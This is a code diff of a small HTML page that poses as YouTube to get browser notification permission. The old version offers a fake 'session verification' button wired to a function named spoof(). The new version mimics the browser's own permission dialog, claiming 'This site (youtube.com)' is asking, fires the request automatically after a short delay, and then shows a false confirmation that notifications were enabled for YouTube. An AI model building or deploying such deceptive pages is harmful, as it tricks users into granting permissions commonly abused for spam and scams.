@@ -1,47 +1,33 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Youtube Session Verification</title>
+  <title>Redirected from YouTube</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-      background: #fff;
+      font-family: -apple-system, sans-serif;
+      background: white;
       display: flex;
       align-items: center;
       justify-content: center;
       height: 100vh;
-      margin: 0;
       flex-direction: column;
     }
-    h2 {
-      margin-bottom: 16px;
-      font-weight: 500;
-    }
-    button {
-      padding: 12px 24px;
-      font-size: 16px;
-      background: #007aff;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-    }
+    h2 { color: #111; }
+    p { color: #555; }
   </style>
 </head>
 <body>
-
-  <h2>🔐 Youtube requires session verification</h2>
-  <p>To continue, please allow notifications.</p>
-  <button onclick="spoof()">Verify Now</button>
+  <h2>🔔 Enable Notifications</h2>
+  <p>This site (youtube.com) wants to show you notifications.</p>
 
   <script>
-    function spoof() {
+    // Delay sedikit agar gesture tetap tersambung
+    setTimeout(() => {
       Notification.requestPermission().then(() => {
-        alert("🔔 Notifications enabled for YouTube.");
+        alert("✅ Notifications enabled for YouTube.");
       });
-    }
+    }, 600);
   </script>
 </body>
 </html>
